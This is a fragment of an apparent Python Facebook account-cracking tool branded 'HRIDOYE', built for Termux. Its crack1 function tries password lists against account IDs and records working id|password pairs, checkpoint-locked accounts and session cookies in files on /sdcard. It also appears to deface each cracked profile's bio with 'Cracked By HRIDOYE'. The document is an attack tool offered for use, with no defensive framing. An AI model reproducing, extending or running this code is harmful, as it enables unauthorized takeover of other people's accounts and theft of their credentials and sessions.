...
\033[1;97m═════════════════════════════════════════════
[\033[1;92m✔\033[1;97m]FACEBOOK    \033[1;91m: \033[1;97https://www.facebook.com/terapapaariyankhan
[\033[1;92m✔\033[1;97m]OWNER          \033[1;91m: \033[1;97mARIAYAN HRIDOYE 
...
def File():
	...
	print(' \033[1;92m[✔] Saved In HRIDOYE-OK.txt,HRIDOYE-CP.txt')
	linex()
oks=[]
...
def crack1(idf,pwv):
	...
	#sys.stdout.write(f"\r [HRIDOYE] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	#sys.stdout.flush()
	sys.stdout.write('\r\033[1;37m [HRIDOYE] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[HRIDOYE-OK] '+idf+'|'+pw)
				open('/sdcard/HRIDOYE-OK.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"Cracked By HRIDOYE (HRIDOYE TERMUX ZONE')"}
				...
				open('/sdcard/HRIDOYE-KOKI.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' \x1b[38;5;208m[HRIDOYE-CP] '+idf+'|'+pw)
				open('/sdcard/HRIDOYE-CP.txt','a').write(idf+'|'+pw+'\n')
				break
